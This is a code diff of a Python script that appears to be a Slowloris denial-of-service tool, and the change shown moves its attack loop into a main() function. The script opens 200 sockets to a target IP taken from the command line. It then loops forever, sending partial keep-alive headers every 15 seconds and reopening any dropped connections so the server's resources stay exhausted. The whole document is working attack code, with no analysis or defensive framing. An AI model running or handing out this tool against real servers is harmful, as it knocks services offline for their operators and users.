@@ -26,32 +26,33 @@ def init_socket(ip):
         s.send("{}\r\n".format(header).encode("utf-8"))
     return s
 
-ip = sys.argv[1]
-socket_count = 200
-log("Attacking {} with {} sockets.".format(ip, socket_count))
+def main():
+    ip = sys.argv[1]
+    socket_count = 200
+    log("Attacking {} with {} sockets.".format(ip, socket_count))
 
-log("Creating sockets...")
-for _ in range(socket_count):
-    try:
-        log("Creating socket nr {}".format(_), level=2)
-        s = init_socket(ip)
-    except socket.error:
-        break
-    list_of_sockets.append(s)
-
-while True:
-    log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
-    for s in list_of_sockets:
+    log("Creating sockets...")
+    for _ in range(socket_count):
         try:
-            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-        except socket.error:
-            list_of_sockets.remove(s)
-    for i in range(socket_count - len(list_of_sockets)):
-        log("Recreating socket...")
-        try:
+            log("Creating socket nr {}".format(_), level=2)
             s = init_socket(ip)
-            if s:
-                list_of_sockets.append(s)
-        except:
-            pass
-    time.sleep(15)
+        except socket.error:
+            break
+        list_of_sockets.append(s)
+
+    while True:
+        log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
+        for s in list_of_sockets:
+            try:
+                s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+            except socket.error:
+                list_of_sockets.remove(s)
+        for i in range(socket_count - len(list_of_sockets)):
+            log("Recreating socket...")
+            try:
+                s = init_socket(ip)
+                if s:
+                    list_of_sockets.append(s)
+            except:
+                pass
+        time.sleep(15)
